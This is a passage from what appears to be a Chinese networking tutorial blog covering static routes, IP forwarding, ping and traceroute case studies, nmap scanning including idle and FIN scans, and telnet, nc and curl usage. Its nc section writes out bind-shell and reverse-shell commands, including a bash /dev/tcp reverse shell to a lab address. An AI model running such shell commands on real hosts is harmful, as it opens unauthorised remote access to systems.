+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;</span><br><span class="line">10.10.12.0/24 via 10.10.15.1</span><br><span class="line">10.10.13.0/24 via 10.10.15.1</span><br><span class="line">10.10.14.0/24 via 10.10.15.1</span><br><span class="line">10.10.15.0/24 via 10.10.15.1</span><br><span class="line">10.10.16.0/24 via 10.10.15.1</span><br><span class="line">&#x27; &gt; /etc/sysconfig/network-scripts/route-eth0</span><br></pre></td></tr></table></figure>
+
+<p>另外一种方法：使用 network.service（CentOS7 默认，CentOS8 需要 <code>yum install network-scripts</code>）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;</span><br><span class="line">any net 10.10.13.0/24 gw 10.10.15.1</span><br><span class="line">any net 10.10.14.0/24 gw 10.10.15.1</span><br><span class="line">any net 10.10.15.0/24 gw 10.10.15.1</span><br><span class="line">any net 10.10.16.0/24 gw 10.10.15.1</span><br><span class="line">&#x27; &gt; /etc/sysconfig/static-routes</span><br></pre></td></tr></table></figure>
+
+<p>验证</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route</span><br></pre></td></tr></table></figure>
+
+<h4 id="开启Linux系统的IP转发功能"><a href="#开启Linux系统的IP转发功能" class="headerlink" title="开启Linux系统的IP转发功能:"></a>开启Linux系统的IP转发功能:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysctl.d/99-sysctl.conf</span><br><span class="line"></span><br><span class="line">结尾添加：net.ipv4.ip_forward = 1</span><br><span class="line"></span><br><span class="line">sysctl -p #查看修改结果.</span><br></pre></td></tr></table></figure>
+
+<h4 id="什么时候需要开启Linux系统的IP转发功能"><a href="#什么时候需要开启Linux系统的IP转发功能" class="headerlink" title="什么时候需要开启Linux系统的IP转发功能"></a>什么时候需要开启Linux系统的IP转发功能</h4><p>一般来说，Linux系统默认是禁止数据包转发的，但在以下几种情况下可能需要开启IP转发功能：</p>
+<ol>
+<li>实现路由器功能：当一个Linux系统拥有多于一块的网卡时，如果一块网卡收到数据包，根据数据包的目的IP地址将包发往本机另一网卡，该网卡根据路由表继续发送数据包，这通常就是路由器所要实现的功能。这时需要开启IP转发功能。</li>
+<li>配置网络负载均衡：Linux要求转发功能可以有效支持负载均衡。将多台服务器的要求转发到同一虚拟服务器上，可以有效利用服务器的处理能力，避免瓶颈的产生，提高服务器的处理能力和性能。</li>
+</ol>
+<p>需要注意的是，开启Linux系统的IP转发功能需要具备一定的网络知识和技能，如果不熟悉相关操作，建议在进行任何更改之前先备份系统或咨询专业的网络管理员。</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fanggege/p/11312050.html">ip_forward与路由转发 - fanggege - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ssgeek/p/9220690.html">配置Linux实现静态路由 - SSgeek - 博客园 (cnblogs.com)</a></p>
+<h3 id="网络排错命令"><a href="#网络排错命令" class="headerlink" title="网络排错命令"></a>网络排错命令</h3><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/342214112">精华 | 网络故障排除命令汇总【网工必须收藏】 - 知乎 (zhihu.com)</a></p>
+<p>原理：源站点向目的站点发出一个ICMP Echo Request报文，目的站点收到该报文后回一个ICMP Echo Reply报文，这样就验证了两个节点间IP层的可达性－－表示了网络层是连通的。</p>
+<p>功能：用于检查IP网络连接及主机是否可达。</p>
+<p>连续 Ping：<code>ping –t 192.168.0.1</code> (Windows 系统)</p>
+<h5 id="判断是连通性问题还是性能问题"><a href="#判断是连通性问题还是性能问题" class="headerlink" title="判断是连通性问题还是性能问题"></a>判断是连通性问题还是性能问题</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">windows：</span></span><br><span class="line">ping -n 20 -w 4000 192.168.91.128</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">linux:</span></span><br><span class="line">ping -c 20 -W 4000 192.168.71.1</span><br></pre></td></tr></table></figure>
+
+<p>即连续发送20个报文，每个报文的超时时长为4000ms，这样一般可以判断出到底是连通性问题还是性能问题。</p>
+<h5 id="使用大包ping对端进行MTU不一致的故障排除"><a href="#使用大包ping对端进行MTU不一致的故障排除" class="headerlink" title="使用大包ping对端进行MTU不一致的故障排除"></a><strong>使用大包ping对端进行MTU不一致的故障排除</strong></h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">windows</span></span><br><span class="line">ping -n 2 -l 1000 192.168.91.128</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">linux:</span></span><br><span class="line">ping -c 1 -s 1000 192.168.91.128</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这是发送一个大小为1000字节的包来检查连接状态</span></span><br></pre></td></tr></table></figure>
+
+<p>由于linux的Ping 缺省报文是64个字节，所以显示的Ping 通信息只是表示64字节的报文可以通而并不一定表示其他大小的报文仍旧可以通。所以，应当善于使用Ping的其他参数来进行故障排除。（此处以linux举例）</p>
+<h5 id="A能够Ping通B则B一定能够Ping通A（不考虑防火墙的因素）"><a href="#A能够Ping通B则B一定能够Ping通A（不考虑防火墙的因素）" class="headerlink" title="A能够Ping通B则B一定能够Ping通A（不考虑防火墙的因素）"></a>A能够Ping通B则B一定能够Ping通A（不考虑防火墙的因素）</h5><ul>
+<li>如果是指两台主机，那么这句话就是正确的。</li>
+<li>如果是指两台路由器那就是错误的，因为路由器通常会有多个IP地址。现在就有如下问题：当从一台路由器上执行Ping命令它发出的ICMP Echo报文的源地址究竟选择哪一个呢？实际情况是路由器选择发出报文的接口的IP地址。</li>
+</ul>
+<h4 id="Traceroute"><a href="#Traceroute" class="headerlink" title="Traceroute"></a><strong>Traceroute</strong></h4><p>（该命令应用在linux系统中）</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/342214112">精华 | 网络故障排除命令汇总【网工必须收藏】 - 知乎 (zhihu.com)</a></p>
+<p>原理：Traceroute是为了探测源节点到目的节点之间数据报文所经过的路径。</p>
+<p>功能：Traceroute 命令用于测试数据报文从发送主机到目的地所经过的网关，主要用于检查网络连接是否可达，以及分析网络什么地方发生了故障。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">linux</span></span><br><span class="line">traceroute -m 10 www.baidu.com # 跳数设置</span><br><span class="line">traceroute -n www.baidu.com    # 显示IP地址，不查主机名</span><br><span class="line">traceroute -p 6888 www.baidu.com  # 探测包使用的基本UDP端口设置6888</span><br><span class="line">traceroute -q 4 www.baidu.com  # 把探测包的个数设置为值4</span><br><span class="line">traceroute -r www.baidu.com    # 绕过正常的路由表，直接发送到网络相连的主机</span><br><span class="line">traceroute -w 3 www.baidu.com  # 把对外发探测包的等待响应时间设置为3秒</span><br></pre></td></tr></table></figure>
+
+<h5 id="案例一：使用Traceroute命令定位不当的网络配置点"><a href="#案例一：使用Traceroute命令定位不当的网络配置点" class="headerlink" title="案例一：使用Traceroute命令定位不当的网络配置点"></a><strong>案例一：使用Traceroute命令定位不当的网络配置点</strong></h5><p>(1) 现象描述</p>
+<p>组网情况如下图所示：</p>
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/v2-7fcfcfa628ba6923e4264c15a8cb6bf2_1440w.webp" class title="img">
+
+
+
+<p>某校园网中，RouterB和RouterC同属于一个运行RIPv2路由协议的网络，主机4.0.0.2访问数据库服务器5.0.0.2，用户抱怨访问性能差。</p>
+<p>(2) 相关信息显示</p>
+<p>在主机上ping 5.0.0.2显示如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\c&gt;ping -n 10 -l 1000 5.0.0.2</span><br><span class="line"></span><br><span class="line">Pinging 5.0.0.2 with 1000 bytes of data:</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=552ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=5735ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=551ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=5734ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=549ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=5634ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=555ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=5738ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=455ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=5811ms TTL=250</span><br></pre></td></tr></table></figure>
+
+<p>原因分析</p>
+<p>上面的Ping显示出一个规律：奇数报文的返回时长短，而偶数报文返回时长很长（是奇数报文的10倍多）。可以初步判断奇数报文和偶数报文是通过不同的路径传输的。现在我们需要使用Traceroute命令来追踪这不同的路径。在RouterC上，Traceroute远端RouterA的以太网接口5.0.0.1。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">RouterC(config)#</span><span class="language-bash">traceroute</span></span><br><span class="line"> Target IP address or host: 5.0.0.1</span><br><span class="line">Maximum number of hops to search for target [30]:10</span><br><span class="line">Repeat count for each echo[3]:8</span><br><span class="line">Wait timeout milliseconds for each reply [2000]:</span><br><span class="line"></span><br><span class="line">Type esc/CTRL^c/CTRL^z/q to abort.</span><br><span class="line">traceroute 5.0.0.1 ......</span><br><span class="line">1    6 ms  4 ms  4 ms  4 ms  4 ms  4 ms  4 ms  4 ms   4.0.0.1</span><br><span class="line">  。。。。。。（中间省略）</span><br><span class="line">5  20 ms  16 ms  15 ms  16 ms  16 ms  16 ms  16 ms  16 ms  3.0.0.2</span><br><span class="line">6  30 ms  278 ms  25 ms  279 ms  25 ms  278 ms  25 ms  277 ms  5.0.0.1</span><br><span class="line"><span class="meta prompt_">RouterC(config)#</span></span><br></pre></td></tr></table></figure>
+
+<p>从上面的显示可看到，直至3.0.0.2，UDP探测报文的返回时长都基本一致，而到5.0.0.1时，则发生明显变化，呈现奇数报文时长短，偶数报文时长长的现象。于是判断，问题发生在RouterB和RouterA之间。</p>
+<p>通过询问该段网络的管理员，得知这两路由器间有一主一备两串行链路，主链路为2.048Mbps（s0口之间），备份链路为128Kbps（s1口之间）。网络管理员在此两路由器间配置了静态路由。</p>
+<p>RouterB上如下配置：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RouterB（config）# ip route 5.0.0.0 255.0.0.0 1.0.0.2</span><br><span class="line">RouterB（config）# ip route 5.0.0.0 255.0.0.0 2.0.0.2</span><br><span class="line">RouterA上如下配置：</span><br><span class="line">RouterA（config）# ip route 0.0.0.0 0.0.0.0 1.0.0.1</span><br><span class="line">RouterA（config）# ip route 0.0.0.0 0.0.0.0 2.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>于是问题就清楚了。例如RouterB，由于管理员配置时没有给出静态路由的优先级，这两条路由项的管理距离就同为缺省值1，于是就同时出现在路由表中，实现的是负载分担，而不能达到主备的目的。</p>
+<p>(3) 处理过程</p>
+<p>可以有两种处理方法：</p>
+<ul>
+<li>继续使用静态路由，进行配置更改 RouterB上进行如下更改：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RouterB（config）# ip route 5.0.0.0 255.0.0.0 1.0.0.2 （主链路仍使用缺省1）</span><br><span class="line">RouterB（config）# ip route 5.0.0.0 255.0.0.0 2.0.0.2 100（备份链路的降低至100）</span><br></pre></td></tr></table></figure>
+
+<p>RouterA上进行如下更改：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RouterA（config）# ip route 0.0.0.0 0.0.0.0 1.0.0.1</span><br><span class="line">RouterA（config）# ip route 0.0.0.0 0.0.0.0 2.0.0.1 100</span><br></pre></td></tr></table></figure>
+
+<p>这样，只有当主链路发生故障，备份链路的路由项才会出线在路由表中，从而接替主链路完成报文转发，实现主备目的。</p>
+<ul>
+<li>在两路由器上运行动态路由协议，如OSPF，但不要运行RIP协议（因为RIP协议是仅以hop作为Metric的）</li>
+</ul>
+<p>(4) 建议和总结</p>
+<p>本案例的目的不是为了解释网络配置问题，而是用来展示Ping命令和Traceroute命令的相互配合来找到网络问题的发生点。尤其在一个大的组网环境中，维护人员可能无法沿着路径逐机排查，此时，能够迅速定位出发生问题的线路或路由器就非常重要了。</p>
+<h5 id="案例二：使用Traceroute命令发现路由环路"><a href="#案例二：使用Traceroute命令发现路由环路" class="headerlink" title="案例二：使用Traceroute命令发现路由环路"></a><strong>案例二：使用Traceroute命令发现路由环路</strong></h5><p>(1) 现象描述 组网情况如下图所示：</p>
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/v2-97e0a417d4f802b6466f6a0a8c3e7641_1440w.webp" class title="img">
+
+<p>三台路由器均配置静态路由，完成后，登录到RouterA上Ping主机4.0.0.2，发现不通。</p>
+<p>(2) 相关信息显示</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">RouterA# </span><span class="language-bash">ping  4.0.0.2</span></span><br><span class="line">Sending 5, 100-byte ICMP Echos to 4.0.0.2,</span><br><span class="line">timeout is 2000 milliseconds.</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">Success rate is 0 percent (0/5)</span><br><span class="line"><span class="meta prompt_">RouterA# </span><span class="language-bash">traceroute 4.0.0.2</span></span><br><span class="line"> Type esc/CTRL^c/CTRL^z/q to abort.</span><br><span class="line">traceroute 4.0.0.2 ......</span><br><span class="line">1  6 ms  4 ms  4 ms   1.0.0.1（RouterB）</span><br><span class="line"> 2  8 ms  8 ms  8 ms   1.0.0.2（RouterA）</span><br><span class="line"> 3  12 ms  12 ms  12 ms 1.0.0.1（RouterB）</span><br><span class="line"> 4  16 ms  16 ms  16 ms 1.0.0.2（RouterA）</span><br><span class="line"> 。。。。。。</span><br></pre></td></tr></table></figure>
+
+<p>(3) 原因分析</p>
+<p>从上面的Traceroute命令的显示可以立即发现，在RouterA和RouterB间产生了路由环路。由于是配置的是静态路由，基本可以断定是RouterA或RouterB的静态路由配置错误。 检查RouterA的路由表，配置的是缺省静态路由：<code>ip route 0.0.0.0 0.0.0.0 1.0.0.1</code>，没有问题。</p>
+<p>检查RouterB的路由表，配置到4.0.0.0网络的静态路由为：<code>ip route 4.0.0.0 255.0.0.0 1.0.0.2</code>――下一跳配置的是1.0.0.2，而不是3.0.0.1。这正是错误所在。</p>
+<p>(4) 处理过程</p>
+<p>修改RouterB的配置如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RouterB（config）# no ip route 4.0.0.0 255.0.0.0 1.0.0.2</span><br><span class="line">RouterB（config）# ip route 4.0.0.0 255.0.0.0 3.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>故障排除。</p>
+<p>(5) 建议和总结</p>
+<p>Traceroute命令能够很容易发现路由环路等潜在问题。当路由器A认为路由器B知道到达目的地的路径，而路由器B也认为路由器A知道目的地时，就是路由环路发生了。使用Ping命令只能知道接收端出现超时错误，而Traceroute能够立即发现环路所在――如果Traceroute命令两次或者多次显示同样的接口。</p>
+<p>当通过Traceroute发现路由环路后，如果配置为：</p>
+<ul>
+<li>静态路由：几乎可以肯定是手工配置有问题，如本案例所示。</li>
+<li>OSPF协议：可能是地址聚合产生的问题。</li>
+<li>多路由协议：可能是路由引入产生的问题。</li>
+</ul>
+<h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>nmap是一款非常强大的主机发现和端口扫描工具，而且nmap运用自带的脚本，还能完成漏洞检测，同时支持多平台。</p>
+<h5 id="nmap常用命令"><a href="#nmap常用命令" class="headerlink" title="nmap常用命令"></a>nmap常用命令</h5><h5 id="实例演示-发现主机"><a href="#实例演示-发现主机" class="headerlink" title="实例演示-发现主机"></a>实例演示-发现主机</h5><p>扫描指定IP地址(ping 扫描)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.3.74</span><br></pre></td></tr></table></figure>
+
+<p>提取文件中的IP地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -iL target.txt</span><br></pre></td></tr></table></figure>
+
+<p>扫描整个网段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.3.1/24</span><br></pre></td></tr></table></figure>
+
+<h5 id="实例演示-端口发现"><a href="#实例演示-端口发现" class="headerlink" title="实例演示-端口发现"></a>实例演示-端口发现</h5><p>扫描主机的指定端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.3.74 -p80</span><br></pre></td></tr></table></figure>
+
+
+<p>使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，ACK。证明端口开放，不建立完整连接）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS  192.168.3.74</span><br></pre></td></tr></table></figure>
+
+<p>使用TCP进行扫描（默认nmap扫描方式）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT  192.168.3.74</span><br></pre></td></tr></table></figure>
+
+<p>使用UDP进行扫描（扫描UDP开放的端口）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 192.168.3.74</span><br></pre></td></tr></table></figure>
+
+<p>使用FIN扫描</p>
+<p>有的时候TCP SYN不是最佳的扫描默认，目标主机可能有IDS&#x2F;IPS系统的存在，防火墙可能过滤掉SYN数据包。而发送一个</p>
+<p>FIN标志的数据包不需要完成TCP的握手。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sF  192.168.3.74</span><br></pre></td></tr></table></figure>
+
+<p>idle扫描（需要指定另外一台主机IP地址，并且目标主机的IPID是递增的）</p>
+<p>idlescan是一种理想的扫描方式，它使用另一台网络上的主机替你发送数据包，从而隐藏自己。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sI  192.168.3.227 192.168.3.74</span><br></pre></td></tr></table></figure>
+
+<h5 id="实例演示-获得服务版本详细信息"><a href="#实例演示-获得服务版本详细信息" class="headerlink" title="实例演示-获得服务版本详细信息"></a>实例演示-获得服务版本详细信息</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.3.74</span><br></pre></td></tr></table></figure>
+
+<h5 id="实例演示-确定主机操作系统"><a href="#实例演示-确定主机操作系统" class="headerlink" title="实例演示-确定主机操作系统"></a>实例演示-确定主机操作系统</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 192.168.3.227</span><br></pre></td></tr></table></figure>
+
+<h5 id="实例应用"><a href="#实例应用" class="headerlink" title="实例应用"></a>实例应用</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/weihua2616/p/6599629.html">扫描工具——Nmap用法详解 - 毛卫华 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap详细使用教程_nmap使用教程-CSDN博客</a></p>
+<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><p>telnet经常用于测试网络及端口占用情况。具体使用如下：</p>
+<p>测试端口命令：</p>
+<p>telnet host 端口</p>
+<p>例：telnet 192.168.31.100 8081</p>
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/20181203234109944.png" class title="img">
+
+<p>连接失败表示端口未占用。否则表示被占用,如下（8080端口已占用）：</p>
+<p>例：telnet 192.168.31.100 8080</p>
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/2018120323440996.png" class title="img">
+
+<h4 id="Arp"><a href="#Arp" class="headerlink" title="Arp"></a>Arp</h4><p>显示第 2 层和第 3 层地址的映射表：Arp –a ；Windows&#x2F;Unix</p>
+<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试tcp一般会想到使用telnet</span></span><br><span class="line">telnet 192.168.12.10 22</span><br><span class="line"></span><br><span class="line"><span class="comment"># telnet不支持udp协议，所以我们可以使用nc，nc可以支持tcp也可以支持udp</span></span><br><span class="line">nc -z -v 192.168.10.12 22 <span class="comment">#tcp</span></span><br><span class="line">nc -z -v -u 192.168.10.12 123 <span class="comment"># udp</span></span><br></pre></td></tr></table></figure>
+
+<p>测试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一个窗口</span></span><br><span class="line">nc -lv 999</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第二个窗口</span></span><br><span class="line">nc -nv 192.168.71.101 999</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">互相都能接收到</span></span><br></pre></td></tr></table></figure>
+
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017113911923.png" class title="image-20231017113911923">
+
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017113928601.png" class title="image-20231017113928601">
+
+<p>远程控制</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888 -c bash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc 192.168.75.121 8888</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114342539.png" class title="image-20231017114342539">
+
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114505036.png" class title="image-20231017114505036">
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控制端执行下面的命令：</span></span><br><span class="line">nc 192.168.75.121 8888 -c bash</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114700376.png" class title="image-20231017114700376">
+
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114852436.png" class title="image-20231017114852436">
+
+<p>反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控端执行下面的命令:</span></span><br><span class="line">bash -i &amp;&gt; /dev/tcp/192.168.75.121/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017115035651.png" class title="image-20231017115035651">
+
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017115048774.png" class title="image-20231017115048774">
+
+<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><blockquote>
+<p>curl -l</p>
+</blockquote>
+<p>可以看到http response的头信息</p>
+<blockquote>
+<p>curl -v</p>
+</blockquote>
+<p>可以显示一次http通信的整个过程，包括端口连接以及http response头信息</p>
+<blockquote>
+<p>curl -L</p>
+</blockquote>
+<p>实现url重定向，用户有301,302跳转的网址(比如http跳转到https)，可以显示跳转后的网址的访问情况。</p>
+<blockquote>
+<p>curl -o</p>
+</blockquote>
+<p>表示将文件保存为命令行中指定的文件名的文件中，可以测试文件的下载的情况，比如-oa表示文件保存的命名为a，一般可以设置-o &#x2F;dev&#x2F;null 它是一个空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据，所以本地没有该文件的保存。</p>
+<blockquote>
+<p>curl -vX POST “url” -d “name&#x3D;123.jpg”</p>
+</blockquote>
+<p>可以指定什么方式请求，默认是GET请求，另外，也可以指定post，delete，比如使用七牛过程中验证回调异常情况可以给自己的服务器发送一个表单的POST请求，可以参考七牛设置notifyURL没有收到回调。</p>
+<blockquote>
+<p>curl -d “user&#x3D;aaa&amp;password&#x3D;12345” <a target="_blank" rel="noopener" href="http://www.aaa.com/login.php">http://www.aaa.com/login.php</a></p>
+</blockquote>
+<p>可以模拟发送的携带的表单的数据</p>
+<blockquote>
+<p>curl -s -o &#x2F;dev&#x2F;null -w%{http_code}”\n” <a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a></p>
+</blockquote>
+<p>获取http的状态码</p>
+<p>-w：从文件中读取要打印信息的格式<br>-o &#x2F;dev&#x2F;null：把响应的内容丢弃，因为我们这里并不关心它，只关心请求的耗时情况<br>-s：不要打印进度条</p>
+<blockquote>
+<p>curl -O <a target="_blank" rel="noopener" href="https://www.qianzhigang.com/archives/880.html">https://www.qianzhigang.com/archives/880.html</a></p>
+</blockquote>
+<p>-O: 该参数使用url中默认的文件名保存文件到本地</p>
